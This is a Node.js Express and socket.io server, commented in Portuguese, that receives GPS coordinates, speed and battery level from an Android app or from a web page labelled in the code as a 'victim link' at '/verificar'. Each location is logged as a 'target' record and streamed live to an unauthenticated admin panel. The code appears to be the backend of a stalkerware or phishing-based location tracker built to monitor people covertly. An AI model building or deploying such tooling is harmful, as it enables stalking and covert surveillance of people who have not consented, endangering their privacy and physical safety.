const express = require('express');
const cors = require('cors');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, { cors: { origin: "*" } });
const path = require('path');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- MEMÓRIA DO SERVIDOR (Salva os registros enquanto o servidor estiver ligado) ---
let historicoGPS = [];

// --- ROTAS DE PÁGINAS ---
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps')); // App Mapa
app.get('/zap', (req, res) => res.render('zap')); // Zap
app.get('/verificar', (req, res) => res.render('fast_track')); // Link Vítima

// --- ROTAS DA API ---

// 1. Recebe a localização (Do App ou do Link)
app.post('/api/gps', (req, res) => {
    const dados = req.body;
    
    // Cria um objeto completo para o registro
    const registro = {
        id: dados.device_id || 'sem_id',
        uuid: Date.now().toString(), // ID único para poder apagar depois
        lat: dados.latitude,
        lng: dados.longitude,
        speed: dados.speed,
        battery: dados.battery,
        timestamp: dados.timestamp,
        provider: dados.provider, // 'web_link' ou 'app_android'
        data_formatada: new Date().toLocaleString('pt-BR')
    };

    // Salva na memória (adiciona no começo da lista)
    historicoGPS.unshift(registro);

    // Se tiver mais de 50 registros, apaga o mais antigo pra não lotar
    if (historicoGPS.length > 50) historicoGPS.pop();

    console.log(`[ALVO] Novo registro salvo: ${registro.provider}`);

    // Avisa o painel em tempo real
    io.emit('gps_update', registro);

    res.status(200).json({ status: "ok" });
});

// 2. Rota para o site pegar o histórico antigo quando atualizar a página
app.get('/api/history', (req, res) => {
    res.json(historicoGPS);
});

// 3. Rota para apagar um registro específico
app.delete('/api/history/:uuid', (req, res) => {
    const uuid = req.params.uuid;
    historicoGPS = historicoGPS.filter(item => item.uuid !== uuid);
    io.emit('registro_apagado', uuid); // Avisa todo mundo pra sumir da tela
    res.json({ status: "apagado" });
});

io.on('connection', (socket) => {
    console.log('[PAINEL] Admin conectado');
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[SISTEMA] Rodando na porta ${PORT}`);
});